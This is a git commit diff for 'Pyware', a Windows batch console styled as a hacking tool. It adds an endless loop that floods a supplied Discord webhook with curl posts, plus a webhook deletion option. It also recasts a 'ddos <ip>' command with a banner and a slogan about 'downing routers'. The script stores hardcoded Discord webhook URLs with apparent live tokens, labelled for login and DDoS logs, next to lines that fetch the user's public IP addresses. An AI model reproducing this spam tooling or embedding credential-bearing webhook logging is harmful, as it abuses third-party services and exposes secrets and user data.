12611067717dbe47a731d72d82baab11c9a0aa84
Duelawig <59671758+AA206yt@users.noreply.github.com>
2021-11-04 19:50:07 -0700

    Update Pyware.bat

--- Pyware.bat
+++ Pyware.bat
@@ -11,25 +11,26 @@ REM  Copyright © Pyware 2021. All Rights Reserved.
 
 :: ----------- Config ----------- ::
 
-@echo off
 title Loading Pyware . . . 
 if not exist %appdata%\Pyware\ goto pywarefilesdownload
 
 :config
 chcp 65001 >nul
 cd %appdata%\Pyware\ >nul
+mode con lines=40 cols=100
 SETLOCAL EnableDelayedExpansion >nul
 for /F "tokens=1,2 delims=#" %%a in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (
   set "DEL=%%a"
 )
-title Pyware Console [Version 0.1]
 
 :: ----------- Variables ----------- ::
 
+title Pyware Console [Version 0.1]
 for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
 for /f %%a in ('powershell Invoke-RestMethod api64.ipify.org') do set PublicIPV6=%%a
 set LoginLOG=https://discord.com/api/webhooks/899201532992561202/DI-cX4ff1sPetnHtis9S1RLvhowjjzsRZTLWrUxvfjueAwALXIpmRYlKdW4JBqJhCUni
 set DDoSLOG=https://discord.com/api/webhooks/899870530419703868/4zq84JKbIqgqz42U6Rj1ZAG8T1_aMmSnAfcHA1ROOtEHMc8ftnMlpzHVSx5q1qaSXQ63
+set filepath=%~f0
 set user=root
 goto console
 
@@ -44,11 +45,11 @@ goto consoleinput
 
 :consoleinput
 set /p input= %USERNAME%@%user% ~ # 
-set command=%input:~5,32%
+set pip=%input:~5,32%
 set color=%input:~6,32%
 set title=%input:~6,32%
 set tcpi=%input:~9,32%
-set tcpp=%input:~13,32%
+set tcpp=%input:~20,32%
 if ["%input%"] == ["help"] goto help REM Opens the help page.
 if ["%input%"] == ["ping %command%"] goto ping REM Pings an external IP.
 if ["%input%"] == ["color %color%"] goto color REM Sets the default console foreground and background colors.
@@ -56,7 +57,7 @@ if ["%input%"] == ["title %title%"] goto title REM Sets the window title for a P
 if ["%input%"] == ["titlereset"] goto titlereset
 if ["%input%"] == ["webem"] goto webem
 if ["%input%"] == ["pping /i %tcpi%"] goto pping REM  Pings an external IP with TCP port. (Not Finished)
-if ["%input%"] == ["ddos"] goto ddos REM  Redirects you to a DDosing Console. (Not Finished)
+if ["%input%"] == ["ddos %command%"] goto ddos REM  Redirects you to a DDosing Console. (Not Finished)
 if ["%input%"] == ["ipl"] goto iplookup REM  Looks up approximate data for an external IP. (Not Finished)
 if ["%input%"] == ["ipinfo"] goto ipinfo REM  Info about you're External IP, IPV4, and IPV6.
 if ["%input%"] == ["ipconfig"] goto ipinfo REM  Info about External IP, IPV4, and IPV6.
@@ -73,11 +74,15 @@ if ["%input%"] == ["  "] goto consoleinput
 if ["%input%"] == ["   "] goto consoleinput
 if ["%input%"] == ["    "] goto consoleinput
 if ["%input%"] == ["     "] goto consoleinput
+if ["%input%"] == ["      "] goto consoleinput
+if ["%input%"] == ["       "] goto consoleinput
+if ["%input%"] == ["        "] goto consoleinput
+if ["%input%"] == ["         "] goto consoleinput
+if ["%input%"] == ["          "] goto consoleinput
 if ["%input%"] == ["x"] exit
 
 
 :invalid
-set input= 
 echo.
 echo '%input%' is not recognized as an internal or external command.
 echo.
@@ -92,22 +97,19 @@ goto consoleinput
 
 :: ----------- paping ----------- ::
 :pping
-set input= 
 cd %appdata%\Pyware\
-set /p port= Port: 
-paping.exe %tcpi% -p %port% -c 3
+paping.exe %tcpi% -p %tcpp% -c 3
 goto consoleinput
 :: ----------- paping ----------- ::
 
 
 :help
-set input= 
 echo.
 echo   ping ^<ip^>                 Pings an external IP.
 echo.
 echo   pping ^<ip^> ^<port^>         Pings an external IP with TCP port.
 echo.
-echo   ddos                      Redirects you to a DDosing Console.
+echo   ddos ^<ip^>                     "downing routers like 9/11" -py
 echo.
 echo   ipl ^<ip^>                  Looks up approximate data for an external IP.
 echo.
@@ -128,23 +130,20 @@ echo.
 echo   clear                     Clears all previous commands.
 echo.
 echo.
-echo   For more information visit pyware.xyz
+echo   For more information, visit pyware.xyz
 echo.
 goto consoleinput
 
 
 :color
-set input= 
 color %color%
 goto consoleinput
 
 
 :: ----------- title ----------- ::
 :title
-set input= 
 title %title%
 goto consoleinput
-
 
 :titlereset
 title Pyware Console [V 0.1]
@@ -155,7 +154,6 @@ goto consoleinput
 :: ----------- webem ----------- ::
 
 :webem
-set input= 
 cls
 echo.
 echo                             ╔╗╔╗╔╗    ╔╗          
@@ -167,16 +165,18 @@ echo                              ╚╝╚╝ ╚══╝╚══╝╚══
 echo.                                       
 echo.
 echo                             [ 1 - New Webhook    ]
-echo                             [ 2 - Spammer        ]
+echo                             [ 2 - Delete Webhook ]
+echo                             [ 3 - Spammer        ]
 echo                             [ x - Back to pyware ]
 echo.
 set /p input= Input: 
-if ["%input%"] == ["1"] goto naval
-if ["%input%"] == ["2"] goto new
+if ["%input%"] == ["1"] goto new
+if ["%input%"] == ["2"] goto delwebhook
 if ["%input%"] == ["3"] goto spammer
 if ["%input%"] == ["x"] goto console
 
 :new
+cls
 set /p WebURL= Webhook URL: 
 set /p Webname= Webhook Name: 
 cls
@@ -190,14 +190,41 @@ curl ^
   %newweb%
 goto input
 
+:delwebhook
+cls
+set /p WebURL= Webhook URL: 
+curl -x "DELETE" %WebURL%
+
+:webspam
+cls
+set /p WebURL= Webhook URL: 
+set /p Webname= Webhook Name: 
+set /p WebCon= Content: 
+curl ^
+  -H "Content-Type: application/json" ^
+  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
+  %WebURL%
+  curl ^
+  -H "Content-Type: application/json" ^
+  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
+  %WebURL%
+  curl ^
+  -H "Content-Type: application/json" ^
+  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
+  %WebURL%
+  curl ^
+  -H "Content-Type: application/json" ^
+  -d "{\"username\": \"%Webname%\", \"content\": \"%WebCon%\"}" ^
+  %WebURL%
+goto webspam
+
 :: ----------- webem ----------- ::
 
 
 :: ----------- update ----------- ::
 :update
-set input= 
 if not "%1"=="am_admin" goto updateadmin
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/AA206yt/Pyware/main/Pyware.bat -Outfile C:\Users\%USERNAME%\Desktop\Pyware.bat"
+powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/AA206yt/Pyware/main/Pyware.bat -Outfile %filepath%"
 echo.
 echo Successfully updated Pyware to the latest and stable version.
 echo.
@@ -206,7 +233,6 @@ echo.
 goto consoleinput
 
 :updateadmin
-set input= 
 echo.
 echo Updating Pyware to the latest version requires administrator privledges.
 echo If you would like to grant administrator privledges please . . .
@@ -216,8 +242,19 @@ if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 
 
 :ddos
-exit
-
+set dargs=%input:~5,32%
+echo [38;2;220;95;255m█[38;2;185;95;255m█[38;2;180;95;255m█[38;2;175;95;255m█[38;2;170;95;255m█[38;2;165;95;255m█[38;2;160;95;255m╗[38;2;155;95;255m [38;2;150;95;255m█[38;2;145;95;255m█[38;2;140;95;255m╗[38;2;135;95;255m [38;2;130;95;255m [38;2;125;95;255m [38;2;120;95;255m█[38;2;115;95;255m█[38;2;110;95;255m╗██╗    ██╗ █████╗ [38;2;125;95;255m█[38;2;120;95;255m█[38;2;115;95;255m█[38;2;140;95;255m█[38;2;140;95;255m█[38;2;140;95;255m█[38;2;170;95;255m╗[38;2;165;95;255m [38;2;160;95;255m███████╗
+echo [38;2;220;95;255m█[38;2;185;95;255m█[38;2;180;95;255m╔[38;2;175;95;255m═[38;2;170;95;255m═[38;2;165;95;255m█[38;2;160;95;255m█[38;2;155;95;255m╗[38;2;150;95;255m╚[38;2;145;95;255m█[38;2;140;95;255m█[38;2;135;95;255m╗[38;2;130;95;255m [38;2;125;95;255m█[38;2;120;95;255m█[38;2;115;95;255m╔[38;2;110;95;255m╝██║    ██║██╔══██╗[38;2;125;95;255m█[38;2;120;95;255m█[38;2;115;95;255m╔[38;2;140;95;255m═[38;2;140;95;255m═[38;2;140;95;255m█[38;2;170;95;255m█[38;2;165;95;255m╗[38;2;160;95;255m██╔════╝
+echo [38;2;220;95;255m█[38;2;185;95;255m█[38;2;180;95;255m█[38;2;175;95;255m█[38;2;170;95;255m█[38;2;165;95;255m█[38;2;160;95;255m╔[38;2;155;95;255m╝[38;2;150;95;255m [38;2;145;95;255m╚[38;2;140;95;255m█[38;2;135;95;255m█[38;2;130;95;255m█[38;2;125;95;255m█[38;2;120;95;255m╔[38;2;115;95;255m╝[38;2;110;95;255m ██║ █╗ ██║███████║[38;2;125;95;255m█[38;2;120;95;255m█[38;2;115;95;255m█[38;2;140;95;255m█[38;2;140;95;255m█[38;2;140;95;255m█[38;2;170;95;255m╔[38;2;165;95;255m╝[38;2;160;95;255m█████╗  
+echo [38;2;220;95;255m█[38;2;185;95;255m█[38;2;180;95;255m╔[38;2;175;95;255m═[38;2;170;95;255m═[38;2;165;95;255m═[38;2;160;95;255m╝[38;2;155;95;255m [38;2;150;95;255m [38;2;145;95;255m [38;2;140;95;255m╚[38;2;135;95;255m█[38;2;130;95;255m█[38;2;125;95;255m╔[38;2;120;95;255m╝[38;2;115;95;255m [38;2;110;95;255m ██║███╗██║██╔══██║[38;2;125;95;255m█[38;2;120;95;255m█[38;2;115;95;255m╔[38;2;140;95;255m═[38;2;140;95;255m═[38;2;140;95;255m█[38;2;170;95;255m█[38;2;165;95;255m╗[38;2;160;95;255m██╔══╝  
+echo [38;2;220;95;255m█[38;2;185;95;255m█[38;2;180;95;255m║[38;2;175;95;255m [38;2;170;95;255m [38;2;165;95;255m [38;2;160;95;255m [38;2;155;95;255m [38;2;150;95;255m [38;2;145;95;255m [38;2;140;95;255m [38;2;135;95;255m█[38;2;130;95;255m█[38;2;125;95;255m║[38;2;120;95;255m [38;2;115;95;255m [38;2;110;95;255m ╚███╔███╔╝██║  ██║[38;2;125;95;255m█[38;2;120;95;255m█[38;2;115;95;255m║[38;2;140;95;255m [38;2;140;95;255m [38;2;140;95;255m█[38;2;170;95;255m█[38;2;165;95;255m║[38;2;160;95;255m███████╗
+echo [38;2;220;95;255m╚[38;2;185;95;255m═[38;2;180;95;255m╝[38;2;175;95;255m [38;2;170;95;255m [38;2;165;95;255m [38;2;160;95;255m [38;2;155;95;255m [38;2;150;95;255m [38;2;145;95;255m [38;2;140;95;255m [38;2;135;95;255m╚[38;2;130;95;255m═[38;2;125;95;255m╝[38;2;120;95;255m [38;2;115;95;255m [38;2;110;95;255m  ╚══╝╚══╝ ╚═╝  ╚═╝[38;2;125;95;255m╚[38;2;120;95;255m═[38;2;115;95;255m╝[38;2;140;95;255m [38;2;140;95;255m [38;2;140;95;255m╚[38;2;170;95;255m═[38;2;165;95;255m╝[38;2;160;95;255m╚══════╝
+echo.
+echo POWERED BY HYDROAPI (OWNED BY PY)
+echo.
+timeout 3 >nul
+pause >nul
+goto main
 
 :ipl
 exit
